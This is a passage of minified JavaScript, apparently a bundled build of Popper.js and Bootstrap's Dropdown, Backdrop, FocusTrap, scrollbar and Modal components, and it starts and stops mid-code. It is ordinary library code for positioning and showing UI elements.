basePlacement=getBasePlacement(placement),invertDistance=[left,top].indexOf(basePlacement)>=0?-1:1,_ref=typeof offset=="function"?offset(Object.assign({},rects,{placement})):offset,skidding=_ref[0],distance=_ref[1],skidding=skidding||0,distance=(distance||0)*invertDistance;return[left,right].indexOf(basePlacement)>=0?{x:distance,y:skidding}:{x:skidding,y:distance}}function offset(_ref2){var state=_ref2.state,options=_ref2.options,name=_ref2.name,_options$offset=options.offset,offset=_options$offset===void 0?[0,0]:_options$offset,data=placements.reduce(function(acc,placement){return acc[placement]=distanceAndSkiddingToXY(placement,state.rects,offset),acc},{}),_data$state$placement=data[state.placement],x=_data$state$placement.x,y=_data$state$placement.y;state.modifiersData.popperOffsets!=null&&(state.modifiersData.popperOffsets.x+=x,state.modifiersData.popperOffsets.y+=y),state.modifiersData[name]=data}const offset$1={name:"offset",enabled:!0,phase:"main",requires:["popperOffsets"],fn:offset};function popperOffsets(_ref){var state=_ref.state,name=_ref.name;state.modifiersData[name]=computeOffsets({reference:state.rects.reference,element:state.rects.popper,strategy:"absolute",placement:state.placement})}const popperOffsets$1={name:"popperOffsets",enabled:!0,phase:"read",fn:popperOffsets,data:{}};function getAltAxis(axis){return axis==="x"?"y":"x"}function preventOverflow(_ref){var _offsetModifierState$,_offsetModifierState$2,state=_ref.state,options=_ref.options,name=_ref.name,_options$mainAxis=options.mainAxis,checkMainAxis=_options$mainAxis===void 0||_options$mainAxis,_options$altAxis=options.altAxis,checkAltAxis=_options$altAxis!==void 0&&_options$altAxis,boundary=options.boundary,rootBoundary=options.rootBoundary,altBoundary=options.altBoundary,padding=options.padding,_options$tether=options.tether,tether=_options$tether===void 0||_options$tether,_options$tetherOffset=options.tetherOffset,tetherOffset=_options$tetherOffset===void 0?0:_options$tetherOffset,overflow=detectOverflow(state,{boundary,rootBoundary,padding,altBoundary}),basePlacement=getBasePlacement(state.placement),variation=getVariation(state.placement),isBasePlacement=!variation,mainAxis=getMainAxisFromPlacement(basePlacement),altAxis=getAltAxis(mainAxis),popperOffsets=state.modifiersData.popperOffsets,referenceRect=state.rects.reference,popperRect=state.rects.popper,tetherOffsetValue=typeof tetherOffset=="function"?tetherOffset(Object.assign({},state.rects,{placement:state.placement})):tetherOffset,normalizedTetherOffsetValue=typeof tetherOffsetValue=="number"?{mainAxis:tetherOffsetValue,altAxis:tetherOffsetValue}:Object.assign({mainAxis:0,altAxis:0},tetherOffsetValue),offsetModifierState=state.modifiersData.offset?state.modifiersData.offset[state.placement]:null,data={x:0,y:0};if(!popperOffsets)return;if(checkMainAxis){var mainSide=mainAxis==="y"?top:left,altSide=mainAxis==="y"?bottom:right,len=mainAxis==="y"?"height":"width",offset=popperOffsets[mainAxis],min$1=offset+overflow[mainSide],max$1=offset-overflow[altSide],additive=tether?-popperRect[len]/2:0,minLen=variation===start?referenceRect[len]:popperRect[len],maxLen=variation===start?-popperRect[len]:-referenceRect[len],arrowElement=state.elements.arrow,arrowRect=tether&&arrowElement?getLayoutRect(arrowElement):{width:0,height:0},arrowPaddingObject=state.modifiersData["arrow#persistent"]?state.modifiersData["arrow#persistent"].padding:getFreshSideObject(),arrowPaddingMin=arrowPaddingObject[mainSide],arrowPaddingMax=arrowPaddingObject[altSide],arrowLen=within(0,referenceRect[len],arrowRect[len]),minOffset=isBasePlacement?referenceRect[len]/2-additive-arrowLen-arrowPaddingMin-normalizedTetherOffsetValue.mainAxis:minLen-arrowLen-arrowPaddingMin-normalizedTetherOffsetValue.mainAxis,maxOffset=isBasePlacement?-referenceRect[len]/2+additive+arrowLen+arrowPaddingMax+normalizedTetherOffsetValue.mainAxis:maxLen+arrowLen+arrowPaddingMax+normalizedTetherOffsetValue.mainAxis,arrowOffsetParent=state.elements.arrow&&getOffsetParent(state.elements.arrow),clientOffset=arrowOffsetParent?mainAxis==="y"?arrowOffsetParent.clientTop||0:arrowOffsetParent.clientLeft||0:0,offsetModifierValue=(_offsetModifierState$=offsetModifierState?.[mainAxis])!=null?_offsetModifierState$:0,tetherMin=offset+minOffset-offsetModifierValue-clientOffset,tetherMax=offset+maxOffset-offsetModifierValue,preventedOffset=within(tether?min(min$1,tetherMin):min$1,offset,tether?max(max$1,tetherMax):max$1);popperOffsets[mainAxis]=preventedOffset,data[mainAxis]=preventedOffset-offset}if(checkAltAxis){var _mainSide=mainAxis==="x"?top:left,_altSide=mainAxis==="x"?bottom:right,_offset=popperOffsets[altAxis],_len=altAxis==="y"?"height":"width",_min=_offset+overflow[_mainSide],_max=_offset-overflow[_altSide],isOriginSide=[top,left].indexOf(basePlacement)!==-1,_offsetModifierValue=(_offsetModifierState$2=offsetModifierState?.[altAxis])!=null?_offsetModifierState$2:0,_tetherMin=isOriginSide?_min:_offset-referenceRect[_len]-popperRect[_len]-_offsetModifierValue+normalizedTetherOffsetValue.altAxis,_tetherMax=isOriginSide?_offset+referenceRect[_len]+popperRect[_len]-_offsetModifierValue-normalizedTetherOffsetValue.altAxis:_max,_preventedOffset=tether&&isOriginSide?withinMaxClamp(_tetherMin,_offset,_tetherMax):within(tether?_tetherMin:_min,_offset,tether?_tetherMax:_max);popperOffsets[altAxis]=_preventedOffset,data[altAxis]=_preventedOffset-_offset}state.modifiersData[name]=data}const preventOverflow$1={name:"preventOverflow",enabled:!0,phase:"main",fn:preventOverflow,requiresIfExists:["offset"]};function getHTMLElementScroll(element){return{scrollLeft:element.scrollLeft,scrollTop:element.scrollTop}}function getNodeScroll(node){return node===getWindow(node)||!isHTMLElement(node)?getWindowScroll(node):getHTMLElementScroll(node)}function isElementScaled(element){var rect=element.getBoundingClientRect(),scaleX=round(rect.width)/element.offsetWidth||1,scaleY=round(rect.height)/element.offsetHeight||1;return scaleX!==1||scaleY!==1}function getCompositeRect(elementOrVirtualElement,offsetParent,isFixed){isFixed===void 0&&(isFixed=!1);var isOffsetParentAnElement=isHTMLElement(offsetParent),offsetParentIsScaled=isHTMLElement(offsetParent)&&isElementScaled(offsetParent),documentElement=getDocumentElement(offsetParent),rect=getBoundingClientRect(elementOrVirtualElement,offsetParentIsScaled,isFixed),scroll={scrollLeft:0,scrollTop:0},offsets={x:0,y:0};return(isOffsetParentAnElement||!isOffsetParentAnElement&&!isFixed)&&((getNodeName(offsetParent)!=="body"||isScrollParent(documentElement))&&(scroll=getNodeScroll(offsetParent)),isHTMLElement(offsetParent)?(offsets=getBoundingClientRect(offsetParent,!0),offsets.x+=offsetParent.clientLeft,offsets.y+=offsetParent.clientTop):documentElement&&(offsets.x=getWindowScrollBarX(documentElement))),{x:rect.left+scroll.scrollLeft-offsets.x,y:rect.top+scroll.scrollTop-offsets.y,width:rect.width,height:rect.height}}function order(modifiers){var map=new Map,visited=new Set,result=[];modifiers.forEach(function(modifier){map.set(modifier.name,modifier)});function sort(modifier){visited.add(modifier.name);var requires=[].concat(modifier.requires||[],modifier.requiresIfExists||[]);requires.forEach(function(dep){if(!visited.has(dep)){var depModifier=map.get(dep);depModifier&&sort(depModifier)}}),result.push(modifier)}return modifiers.forEach(function(modifier){visited.has(modifier.name)||sort(modifier)}),result}function orderModifiers(modifiers){var orderedModifiers=order(modifiers);return modifierPhases.reduce(function(acc,phase){return acc.concat(orderedModifiers.filter(function(modifier){return modifier.phase===phase}))},[])}function debounce(fn){var pending;return function(){return pending||(pending=new Promise(function(resolve){Promise.resolve().then(function(){pending=void 0,resolve(fn())})})),pending}}function mergeByName(modifiers){var merged=modifiers.reduce(function(merged,current){var existing=merged[current.name];return merged[current.name]=existing?Object.assign({},existing,current,{options:Object.assign({},existing.options,current.options),data:Object.assign({},existing.data,current.data)}):current,merged},{});return Object.keys(merged).map(function(key){return merged[key]})}var DEFAULT_OPTIONS={placement:"bottom",modifiers:[],strategy:"absolute"};function areValidElements(){for(var _len=arguments.length,args=new Array(_len),_key=0;_key<_len;_key++)args[_key]=arguments[_key];return!args.some(function(element){return!element||typeof element.getBoundingClientRect!="function"})}function popperGenerator(generatorOptions){generatorOptions===void 0&&(generatorOptions={});var _generatorOptions=generatorOptions,_generatorOptions$def=_generatorOptions.defaultModifiers,defaultModifiers=_generatorOptions$def===void 0?[]:_generatorOptions$def,_generatorOptions$def2=_generatorOptions.defaultOptions,defaultOptions=_generatorOptions$def2===void 0?DEFAULT_OPTIONS:_generatorOptions$def2;return function(reference,popper,options){options===void 0&&(options=defaultOptions);var state={placement:"bottom",orderedModifiers:[],options:Object.assign({},DEFAULT_OPTIONS,defaultOptions),modifiersData:{},elements:{reference,popper},attributes:{},styles:{}},effectCleanupFns=[],isDestroyed=!1,instance={state,setOptions:function(setOptionsAction){var options=typeof setOptionsAction=="function"?setOptionsAction(state.options):setOptionsAction;cleanupModifierEffects(),state.options=Object.assign({},defaultOptions,state.options,options),state.scrollParents={reference:isElement(reference)?listScrollParents(reference):reference.contextElement?listScrollParents(reference.contextElement):[],popper:listScrollParents(popper)};var orderedModifiers=orderModifiers(mergeByName([].concat(defaultModifiers,state.options.modifiers)));return state.orderedModifiers=orderedModifiers.filter(function(m){return m.enabled}),runModifierEffects(),instance.update()},forceUpdate:function(){if(isDestroyed)return;var _state$elements=state.elements,reference=_state$elements.reference,popper=_state$elements.popper;if(!areValidElements(reference,popper))return;state.rects={reference:getCompositeRect(reference,getOffsetParent(popper),state.options.strategy==="fixed"),popper:getLayoutRect(popper)},state.reset=!1,state.placement=state.options.placement,state.orderedModifiers.forEach(function(modifier){return state.modifiersData[modifier.name]=Object.assign({},modifier.data)});for(var index=0;index<state.orderedModifiers.length;index++){if(state.reset===!0){state.reset=!1,index=-1;continue}var _state$orderedModifie=state.orderedModifiers[index],fn=_state$orderedModifie.fn,_state$orderedModifie2=_state$orderedModifie.options,_options=_state$orderedModifie2===void 0?{}:_state$orderedModifie2,name=_state$orderedModifie.name;typeof fn=="function"&&(state=fn({state,options:_options,name,instance})||state)}},update:debounce(function(){return new Promise(function(resolve){instance.forceUpdate(),resolve(state)})}),destroy:function(){cleanupModifierEffects(),isDestroyed=!0}};if(!areValidElements(reference,popper))return instance;instance.setOptions(options).then(function(state){!isDestroyed&&options.onFirstUpdate&&options.onFirstUpdate(state)});function runModifierEffects(){state.orderedModifiers.forEach(function(_ref){var name=_ref.name,_ref$options=_ref.options,options=_ref$options===void 0?{}:_ref$options,effect=_ref.effect;if(typeof effect=="function"){var cleanupFn=effect({state,name,instance,options}),noopFn=function(){};effectCleanupFns.push(cleanupFn||noopFn)}})}function cleanupModifierEffects(){effectCleanupFns.forEach(function(fn){return fn()}),effectCleanupFns=[]}return instance}}var createPopper$2=popperGenerator(),defaultModifiers$1=[eventListeners,popperOffsets$1,computeStyles$1,applyStyles$1],createPopper$1=popperGenerator({defaultModifiers:defaultModifiers$1}),defaultModifiers=[eventListeners,popperOffsets$1,computeStyles$1,applyStyles$1,offset$1,flip$1,preventOverflow$1,arrow$1,hide$1],createPopper=popperGenerator({defaultModifiers});const Popper=Object.freeze(Object.defineProperty({__proto__:null,afterMain,afterRead,afterWrite,applyStyles:applyStyles$1,arrow:arrow$1,auto,basePlacements,beforeMain,beforeRead,beforeWrite,bottom,clippingParents,computeStyles:computeStyles$1,createPopper,createPopperBase:createPopper$2,createPopperLite:createPopper$1,detectOverflow,end,eventListeners,flip:flip$1,hide:hide$1,left,main,modifierPhases,offset:offset$1,placements,popper,popperGenerator,popperOffsets:popperOffsets$1,preventOverflow:preventOverflow$1,read,reference,right,start,top,variationPlacements,viewport,write},Symbol.toStringTag,{value:"Module"})),NAME$a="dropdown",DATA_KEY$6="bs.dropdown",EVENT_KEY$6=`.${DATA_KEY$6}`,DATA_API_KEY$3=".data-api",ESCAPE_KEY$2="Escape",TAB_KEY$1="Tab",ARROW_UP_KEY$1="ArrowUp",ARROW_DOWN_KEY$1="ArrowDown",RIGHT_MOUSE_BUTTON=2,EVENT_HIDE$5=`hide${EVENT_KEY$6}`,EVENT_HIDDEN$5=`hidden${EVENT_KEY$6}`,EVENT_SHOW$5=`show${EVENT_KEY$6}`,EVENT_SHOWN$5=`shown${EVENT_KEY$6}`,EVENT_CLICK_DATA_API$3=`click${EVENT_KEY$6}${DATA_API_KEY$3}`,EVENT_KEYDOWN_DATA_API=`keydown${EVENT_KEY$6}${DATA_API_KEY$3}`,EVENT_KEYUP_DATA_API=`keyup${EVENT_KEY$6}${DATA_API_KEY$3}`,CLASS_NAME_SHOW$6="show",CLASS_NAME_DROPUP="dropup",CLASS_NAME_DROPEND="dropend",CLASS_NAME_DROPSTART="dropstart",CLASS_NAME_DROPUP_CENTER="dropup-center",CLASS_NAME_DROPDOWN_CENTER="dropdown-center",SELECTOR_DATA_TOGGLE$3='[data-bs-toggle="dropdown"]:not(.disabled):not(:disabled)',SELECTOR_DATA_TOGGLE_SHOWN=`${SELECTOR_DATA_TOGGLE$3}.${CLASS_NAME_SHOW$6}`,SELECTOR_MENU=".dropdown-menu",SELECTOR_NAVBAR=".navbar",SELECTOR_NAVBAR_NAV=".navbar-nav",SELECTOR_VISIBLE_ITEMS=".dropdown-menu .dropdown-item:not(.disabled):not(:disabled)",PLACEMENT_TOP=isRTL()?"top-end":"top-start",PLACEMENT_TOPEND=isRTL()?"top-start":"top-end",PLACEMENT_BOTTOM=isRTL()?"bottom-end":"bottom-start",PLACEMENT_BOTTOMEND=isRTL()?"bottom-start":"bottom-end",PLACEMENT_RIGHT=isRTL()?"left-start":"right-start",PLACEMENT_LEFT=isRTL()?"right-start":"left-start",PLACEMENT_TOPCENTER="top",PLACEMENT_BOTTOMCENTER="bottom",Default$9={autoClose:!0,boundary:"clippingParents",display:"dynamic",offset:[0,2],popperConfig:null,reference:"toggle"},DefaultType$9={autoClose:"(boolean|string)",boundary:"(string|element)",display:"string",offset:"(array|string|function)",popperConfig:"(null|object|function)",reference:"(string|element|object)"};class Dropdown extends BaseComponent{constructor(element,config){super(element,config),this._popper=null,this._parent=this._element.parentNode,this._menu=SelectorEngine.next(this._element,SELECTOR_MENU)[0]||SelectorEngine.prev(this._element,SELECTOR_MENU)[0]||SelectorEngine.findOne(SELECTOR_MENU,this._parent),this._inNavbar=this._detectNavbar()}static get Default(){return Default$9}static get DefaultType(){return DefaultType$9}static get NAME(){return NAME$a}toggle(){return this._isShown()?this.hide():this.show()}show(){if(isDisabled(this._element)||this._isShown())return;const relatedTarget={relatedTarget:this._element},showEvent=EventHandler.trigger(this._element,EVENT_SHOW$5,relatedTarget);if(showEvent.defaultPrevented)return;if(this._createPopper(),"ontouchstart"in document.documentElement&&!this._parent.closest(SELECTOR_NAVBAR_NAV))for(const element of[].concat(...document.body.children))EventHandler.on(element,"mouseover",noop);this._element.focus(),this._element.setAttribute("aria-expanded",!0),this._menu.classList.add(CLASS_NAME_SHOW$6),this._element.classList.add(CLASS_NAME_SHOW$6),EventHandler.trigger(this._element,EVENT_SHOWN$5,relatedTarget)}hide(){if(isDisabled(this._element)||!this._isShown())return;const relatedTarget={relatedTarget:this._element};this._completeHide(relatedTarget)}dispose(){this._popper&&this._popper.destroy(),super.dispose()}update(){this._inNavbar=this._detectNavbar(),this._popper&&this._popper.update()}_completeHide(relatedTarget){const hideEvent=EventHandler.trigger(this._element,EVENT_HIDE$5,relatedTarget);if(hideEvent.defaultPrevented)return;if("ontouchstart"in document.documentElement)for(const element of[].concat(...document.body.children))EventHandler.off(element,"mouseover",noop);this._popper&&this._popper.destroy(),this._menu.classList.remove(CLASS_NAME_SHOW$6),this._element.classList.remove(CLASS_NAME_SHOW$6),this._element.setAttribute("aria-expanded","false"),Manipulator.removeDataAttribute(this._menu,"popper"),EventHandler.trigger(this._element,EVENT_HIDDEN$5,relatedTarget)}_getConfig(config){if(config=super._getConfig(config),typeof config.reference=="object"&&!isElement$1(config.reference)&&typeof config.reference.getBoundingClientRect!="function")throw new TypeError(`${NAME$a.toUpperCase()}: Option "reference" provided type "object" without a required "getBoundingClientRect" method.`);return config}_createPopper(){if(typeof Popper=="undefined")throw new TypeError("Bootstrap's dropdowns require Popper (https://popper.js.org)");let referenceElement=this._element;this._config.reference==="parent"?referenceElement=this._parent:isElement$1(this._config.reference)?referenceElement=getElement(this._config.reference):typeof this._config.reference=="object"&&(referenceElement=this._config.reference);const popperConfig=this._getPopperConfig();this._popper=createPopper(referenceElement,this._menu,popperConfig)}_isShown(){return this._menu.classList.contains(CLASS_NAME_SHOW$6)}_getPlacement(){const parentDropdown=this._parent;if(parentDropdown.classList.contains(CLASS_NAME_DROPEND))return PLACEMENT_RIGHT;if(parentDropdown.classList.contains(CLASS_NAME_DROPSTART))return PLACEMENT_LEFT;if(parentDropdown.classList.contains(CLASS_NAME_DROPUP_CENTER))return PLACEMENT_TOPCENTER;if(parentDropdown.classList.contains(CLASS_NAME_DROPDOWN_CENTER))return PLACEMENT_BOTTOMCENTER;const isEnd=getComputedStyle(this._menu).getPropertyValue("--bs-position").trim()==="end";return parentDropdown.classList.contains(CLASS_NAME_DROPUP)?isEnd?PLACEMENT_TOPEND:PLACEMENT_TOP:isEnd?PLACEMENT_BOTTOMEND:PLACEMENT_BOTTOM}_detectNavbar(){return this._element.closest(SELECTOR_NAVBAR)!==null}_getOffset(){const{offset}=this._config;return typeof offset=="string"?offset.split(",").map(value=>Number.parseInt(value,10)):typeof offset=="function"?popperData=>offset(popperData,this._element):offset}_getPopperConfig(){const defaultBsPopperConfig={placement:this._getPlacement(),modifiers:[{name:"preventOverflow",options:{boundary:this._config.boundary}},{name:"offset",options:{offset:this._getOffset()}}]};return(this._inNavbar||this._config.display==="static")&&(Manipulator.setDataAttribute(this._menu,"popper","static"),defaultBsPopperConfig.modifiers=[{name:"applyStyles",enabled:!1}]),{...defaultBsPopperConfig,...execute(this._config.popperConfig,[defaultBsPopperConfig])}}_selectMenuItem({key,target}){const items=SelectorEngine.find(SELECTOR_VISIBLE_ITEMS,this._menu).filter(element=>isVisible(element));if(!items.length)return;getNextActiveElement(items,target,key===ARROW_DOWN_KEY$1,!items.includes(target)).focus()}static jQueryInterface(config){return this.each(function(){const data=Dropdown.getOrCreateInstance(this,config);if(typeof config!="string")return;if(typeof data[config]=="undefined")throw new TypeError(`No method named "${config}"`);data[config]()})}static clearMenus(event){if(event.button===RIGHT_MOUSE_BUTTON||event.type==="keyup"&&event.key!==TAB_KEY$1)return;const openToggles=SelectorEngine.find(SELECTOR_DATA_TOGGLE_SHOWN);for(const toggle of openToggles){const context=Dropdown.getInstance(toggle);if(!context||context._config.autoClose===!1)continue;const composedPath=event.composedPath(),isMenuTarget=composedPath.includes(context._menu);if(composedPath.includes(context._element)||context._config.autoClose==="inside"&&!isMenuTarget||context._config.autoClose==="outside"&&isMenuTarget)continue;if(context._menu.contains(event.target)&&(event.type==="keyup"&&event.key===TAB_KEY$1||/input|select|option|textarea|form/i.test(event.target.tagName)))continue;const relatedTarget={relatedTarget:context._element};event.type==="click"&&(relatedTarget.clickEvent=event),context._completeHide(relatedTarget)}}static dataApiKeydownHandler(event){const isInput=/input|textarea/i.test(event.target.tagName),isEscapeEvent=event.key===ESCAPE_KEY$2,isUpOrDownEvent=[ARROW_UP_KEY$1,ARROW_DOWN_KEY$1].includes(event.key);if(!isUpOrDownEvent&&!isEscapeEvent)return;if(isInput&&!isEscapeEvent)return;event.preventDefault();const getToggleButton=this.matches(SELECTOR_DATA_TOGGLE$3)?this:SelectorEngine.prev(this,SELECTOR_DATA_TOGGLE$3)[0]||SelectorEngine.next(this,SELECTOR_DATA_TOGGLE$3)[0]||SelectorEngine.findOne(SELECTOR_DATA_TOGGLE$3,event.delegateTarget.parentNode),instance=Dropdown.getOrCreateInstance(getToggleButton);if(isUpOrDownEvent){event.stopPropagation(),instance.show(),instance._selectMenuItem(event);return}instance._isShown()&&(event.stopPropagation(),instance.hide(),getToggleButton.focus())}}EventHandler.on(document,EVENT_KEYDOWN_DATA_API,SELECTOR_DATA_TOGGLE$3,Dropdown.dataApiKeydownHandler),EventHandler.on(document,EVENT_KEYDOWN_DATA_API,SELECTOR_MENU,Dropdown.dataApiKeydownHandler),EventHandler.on(document,EVENT_CLICK_DATA_API$3,Dropdown.clearMenus),EventHandler.on(document,EVENT_KEYUP_DATA_API,Dropdown.clearMenus),EventHandler.on(document,EVENT_CLICK_DATA_API$3,SELECTOR_DATA_TOGGLE$3,function(event){event.preventDefault(),Dropdown.getOrCreateInstance(this).toggle()}),defineJQueryPlugin(Dropdown);const NAME$9="backdrop",CLASS_NAME_FADE$4="fade",CLASS_NAME_SHOW$5="show",EVENT_MOUSEDOWN=`mousedown.bs.${NAME$9}`,Default$8={className:"modal-backdrop",clickCallback:null,isAnimated:!1,isVisible:!0,rootElement:"body"},DefaultType$8={className:"string",clickCallback:"(function|null)",isAnimated:"boolean",isVisible:"boolean",rootElement:"(element|string)"};class Backdrop extends Config{constructor(config){super(),this._config=this._getConfig(config),this._isAppended=!1,this._element=null}static get Default(){return Default$8}static get DefaultType(){return DefaultType$8}static get NAME(){return NAME$9}show(callback){if(!this._config.isVisible){execute(callback);return}this._append();const element=this._getElement();this._config.isAnimated&&reflow(element),element.classList.add(CLASS_NAME_SHOW$5),this._emulateAnimation(()=>{execute(callback)})}hide(callback){if(!this._config.isVisible){execute(callback);return}this._getElement().classList.remove(CLASS_NAME_SHOW$5),this._emulateAnimation(()=>{this.dispose(),execute(callback)})}dispose(){if(!this._isAppended)return;EventHandler.off(this._element,EVENT_MOUSEDOWN),this._element.remove(),this._isAppended=!1}_getElement(){if(!this._element){const backdrop=document.createElement("div");backdrop.className=this._config.className,this._config.isAnimated&&backdrop.classList.add(CLASS_NAME_FADE$4),this._element=backdrop}return this._element}_configAfterMerge(config){return config.rootElement=getElement(config.rootElement),config}_append(){if(this._isAppended)return;const element=this._getElement();this._config.rootElement.append(element),EventHandler.on(element,EVENT_MOUSEDOWN,()=>{execute(this._config.clickCallback)}),this._isAppended=!0}_emulateAnimation(callback){executeAfterTransition(callback,this._getElement(),this._config.isAnimated)}}const NAME$8="focustrap",DATA_KEY$5="bs.focustrap",EVENT_KEY$5=`.${DATA_KEY$5}`,EVENT_FOCUSIN$2=`focusin${EVENT_KEY$5}`,EVENT_KEYDOWN_TAB=`keydown.tab${EVENT_KEY$5}`,TAB_KEY="Tab",TAB_NAV_FORWARD="forward",TAB_NAV_BACKWARD="backward",Default$7={autofocus:!0,trapElement:null},DefaultType$7={autofocus:"boolean",trapElement:"element"};class FocusTrap extends Config{constructor(config){super(),this._config=this._getConfig(config),this._isActive=!1,this._lastTabNavDirection=null}static get Default(){return Default$7}static get DefaultType(){return DefaultType$7}static get NAME(){return NAME$8}activate(){if(this._isActive)return;this._config.autofocus&&this._config.trapElement.focus(),EventHandler.off(document,EVENT_KEY$5),EventHandler.on(document,EVENT_FOCUSIN$2,event=>this._handleFocusin(event)),EventHandler.on(document,EVENT_KEYDOWN_TAB,event=>this._handleKeydown(event)),this._isActive=!0}deactivate(){if(!this._isActive)return;this._isActive=!1,EventHandler.off(document,EVENT_KEY$5)}_handleFocusin(event){const{trapElement}=this._config;if(event.target===document||event.target===trapElement||trapElement.contains(event.target))return;const elements=SelectorEngine.focusableChildren(trapElement);elements.length===0?trapElement.focus():this._lastTabNavDirection===TAB_NAV_BACKWARD?elements[elements.length-1].focus():elements[0].focus()}_handleKeydown(event){if(event.key!==TAB_KEY)return;this._lastTabNavDirection=event.shiftKey?TAB_NAV_BACKWARD:TAB_NAV_FORWARD}}const SELECTOR_FIXED_CONTENT=".fixed-top, .fixed-bottom, .is-fixed, .sticky-top",SELECTOR_STICKY_CONTENT=".sticky-top",PROPERTY_PADDING="padding-right",PROPERTY_MARGIN="margin-right";class ScrollBarHelper{constructor(){this._element=document.body}getWidth(){const documentWidth=document.documentElement.clientWidth;return Math.abs(window.innerWidth-documentWidth)}hide(){const width=this.getWidth();this._disableOverFlow(),this._setElementAttributes(this._element,PROPERTY_PADDING,calculatedValue=>calculatedValue+width),this._setElementAttributes(SELECTOR_FIXED_CONTENT,PROPERTY_PADDING,calculatedValue=>calculatedValue+width),this._setElementAttributes(SELECTOR_STICKY_CONTENT,PROPERTY_MARGIN,calculatedValue=>calculatedValue-width)}reset(){this._resetElementAttributes(this._element,"overflow"),this._resetElementAttributes(this._element,PROPERTY_PADDING),this._resetElementAttributes(SELECTOR_FIXED_CONTENT,PROPERTY_PADDING),this._resetElementAttributes(SELECTOR_STICKY_CONTENT,PROPERTY_MARGIN)}isOverflowing(){return this.getWidth()>0}_disableOverFlow(){this._saveInitialAttribute(this._element,"overflow"),this._element.style.overflow="hidden"}_setElementAttributes(selector,styleProperty,callback){const scrollbarWidth=this.getWidth(),manipulationCallBack=element=>{if(element!==this._element&&window.innerWidth>element.clientWidth+scrollbarWidth)return;this._saveInitialAttribute(element,styleProperty);const calculatedValue=window.getComputedStyle(element).getPropertyValue(styleProperty);element.style.setProperty(styleProperty,`${callback(Number.parseFloat(calculatedValue))}px`)};this._applyManipulationCallback(selector,manipulationCallBack)}_saveInitialAttribute(element,styleProperty){const actualValue=element.style.getPropertyValue(styleProperty);actualValue&&Manipulator.setDataAttribute(element,styleProperty,actualValue)}_resetElementAttributes(selector,styleProperty){const manipulationCallBack=element=>{const value=Manipulator.getDataAttribute(element,styleProperty);if(value===null){element.style.removeProperty(styleProperty);return}Manipulator.removeDataAttribute(element,styleProperty),element.style.setProperty(styleProperty,value)};this._applyManipulationCallback(selector,manipulationCallBack)}_applyManipulationCallback(selector,callBack){if(isElement$1(selector)){callBack(selector);return}for(const sel of SelectorEngine.find(selector,this._element))callBack(sel)}}const NAME$7="modal",DATA_KEY$4="bs.modal",EVENT_KEY$4=`.${DATA_KEY$4}`,DATA_API_KEY$2=".data-api",ESCAPE_KEY$1="Escape",EVENT_HIDE$4=`hide${EVENT_KEY$4}`,EVENT_HIDE_PREVENTED$1=`hidePrevented${EVENT_KEY$4}`,EVENT_HIDDEN$4=`hidden${EVENT_KEY$4}`,EVENT_SHOW$4=`show${EVENT_KEY$4}`,EVENT_SHOWN$4=`shown${EVENT_KEY$4}`,EVENT_RESIZE$1=`resize${EVENT_KEY$4}`,EVENT_CLICK_DISMISS=`click.dismiss${EVENT_KEY$4}`,EVENT_MOUSEDOWN_DISMISS=`mousedown.dismiss${EVENT_KEY$4}`,EVENT_KEYDOWN_DISMISS$1=`keydown.dismiss${EVENT_KEY$4}`,EVENT_CLICK_DATA_API$2=`click${EVENT_KEY$4}${DATA_API_KEY$2}`,CLASS_NAME_OPEN="modal-open",CLASS_NAME_FADE$3="fade",CLASS_NAME_SHOW$4="show",CLASS_NAME_STATIC="modal-static",OPEN_SELECTOR$1=".modal.show",SELECTOR_DIALOG=".modal-dialog",SELECTOR_MODAL_BODY=".modal-body",SELECTOR_DATA_TOGGLE$2='[data-bs-toggle="modal"]',Default$6={backdrop:!0,focus:!0,keyboard:!0},DefaultType$6={backdrop:"(boolean|string)",focus:"boolean",keyboard:"boolean"};class Modal extends BaseComponent{constructor(element,config){super(element,config),this._dialog=SelectorEngine.findOne(SELECTOR_DIALOG,this._element),this._backdrop=this._initializeBackDrop(),this._focustrap=this._initializeFocusTrap(),this._isShown=!1,this._isTransitioning=!1,this._scrollBar=new ScrollBarHelper,this._addEventListeners()}static get Default(){return Default$6}static get DefaultType(){return DefaultType$6}static get NAME(){return NAME$7}toggle(relatedTarget){return this._isShown?this.hide():this.show(relatedTarget)}show(relatedTarget){if(this._isShown||this._isTransitioning)return;const showEvent=EventHandler.trigger(this._element,EVENT_SHOW$4,{relatedTarget});if(showEvent.defaultPrevented)return;this._isShown=!0,this._isTransitioning=!0,this._scrollBar.hide(),document.body.classList.add(CLASS_NAME_OPEN),this._adjustDialog(),this._backdrop.show(()=>this._showElement(relatedTarget))}hide(){if(!this._isShown||this._isTransitioning)return;const hideEvent=EventHandler.trigger(this._element,EVENT_HIDE$4);if(hideEvent.defaultPrevented)return;this._isShown=!1,this._isTransitioning=!0,this._focustrap.deactivate(),this._element.classList.remove(CLASS_NAME_SHOW$4),this._queueCallback(()=>this._hideModal(),this._element,this._isAnimated())}dispose(){EventHandler.off(window,EVENT_KEY$4),EventHandler.off(this._dialog,EVENT_KEY$4),this._backdrop.dispose(),this._focustrap.deactivate(),super.dispose()}handleUpdate(){this._adjustDialog()}_initializeBackDrop(){return new Backdrop({isVisible:Boolean(this._config.backdrop),isAnimated:this._isAnimated()})}_initializeFocusTrap(){return new FocusTrap({trapElement:this._element})}_showElement(relatedTarget){document.body.contains(this._element)||document.body.append(this._element),this._element.style.display="block",this._element.removeAttribute("aria-hidden"),this._element.setAttribute("aria-modal",!0),this._element.setAttribute("role","dialog"),this._element.scrollTop=0;const modalBody=SelectorEngine.findOne(SELECTOR_MODAL_BODY,this._dialog);modalBody&&(modalBody.scrollTop=0),reflow(this._element),this._element.classList.add(CLASS_NAME_SHOW$4);const transitionComplete=()=>{this._config.focus&&this._focustrap.activate(),this._isTransitioning=!1,EventHandler.trigger(this._element,EVENT_SHOWN$4,{relatedTarget})};this._queueCallback(transitionComplete,this._dialog,this._isAnimated())}_addEventListeners(){EventHandler.on(this._element,EVENT_KEYDOWN_DISMISS$1,event=>{if(event.key!==ESCAPE_KEY$1)return;if(this._config.keyboard){this.hide();return}this._triggerBackdropTransition()}),EventHandler.on(window,EVENT_RESIZE$1,()=>{this._isShown&&!this._isTransitioning&&this._adjustDialog()}),EventHandler.on(this._element,EVENT_MOUSEDOWN_DISMISS,event=>{EventHandler.one(this._element,EVENT_CLICK_DISMISS,event2=>{if(this._element!==event.target||this._element!==event2.target)return;if(this._config.backdrop==="static"){this._triggerBackdropTransition();return}this._config.backdrop&&this.hide()})})}_hideModal(){this._element.style.display="none",this._element.setAttribute("aria-hidden",!0),this._element.removeAttribute("aria-modal"),this._element.removeAttribute("role"),this._isTransitioning=!1,this._backdrop.hide(()=>{document.b